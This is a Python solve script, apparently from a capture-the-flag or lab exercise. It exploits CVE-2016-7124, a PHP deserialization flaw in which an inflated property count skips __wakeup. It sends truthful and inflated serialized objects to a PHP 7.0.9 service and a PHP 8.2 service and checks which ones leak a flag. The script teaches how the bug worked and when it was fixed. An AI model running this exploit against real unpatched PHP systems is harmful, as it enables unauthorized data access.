#!/usr/bin/env python3
"""
08 - the historical "level 0": CVE-2016-7124 against the PHP 7.0.9 service.

    usage: solve_legacy.py [legacy-url] [modern-url]

Sends the exact same object twice, once with a truthful property count and once
with an inflated one, and does it against both services so the one-byte
difference -- and the fact that it stopped working in 7.0.10 -- is visible side
by side.
"""

import sys

import payloads
from client import Postbox


def probe(box: Postbox, tag: str, name: str) -> bool:
    # payloads.label() appends this run's nonce, so a spool entry left behind by
    # an earlier request can never be mistaken for this one.
    label = payloads.label((tag + "-" + name).encode())
    blob = (payloads.payload_naive(label) if name == "count3"
            else payloads.payload_cve_2016_7124(label))
    box.deliver(blob)
    flag = box.flag_for(label)
    head = blob[:28]
    print(f"    {head!r}...  -> {flag.decode() if flag else 'nothing (scrubbed)'}")
    return flag is not None


def main() -> int:
    legacy = sys.argv[1] if len(sys.argv) > 1 else "http://legacy"
    modern = sys.argv[2] if len(sys.argv) > 2 else "http://challenge"

    print(f"[*] legacy (PHP 7.0.9) {legacy}")
    honest_old = probe(Postbox(legacy), "l", "count3")
    cheat_old = probe(Postbox(legacy), "l", "count4")

    print(f"[*] modern (PHP 8.2)   {modern}")
    honest_new = probe(Postbox(modern), "m", "count3")
    cheat_new = probe(Postbox(modern), "m", "count4")

    print()
    print(f"[=] 7.0.9 honest count : {'leaked' if honest_old else 'scrubbed'}   (expected: scrubbed)")
    print(f"[=] 7.0.9 inflated     : {'leaked' if cheat_old else 'scrubbed'}   (expected: leaked)")
    print(f"[=] 8.2   honest count : {'leaked' if honest_new else 'scrubbed'}   (expected: scrubbed)")
    print(f"[=] 8.2   inflated     : {'leaked' if cheat_new else 'scrubbed'}   (expected: scrubbed)")

    ok = (not honest_old) and cheat_old and (not honest_new) and (not cheat_new)
    print("RESULT:", "as documented" if ok else "UNEXPECTED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
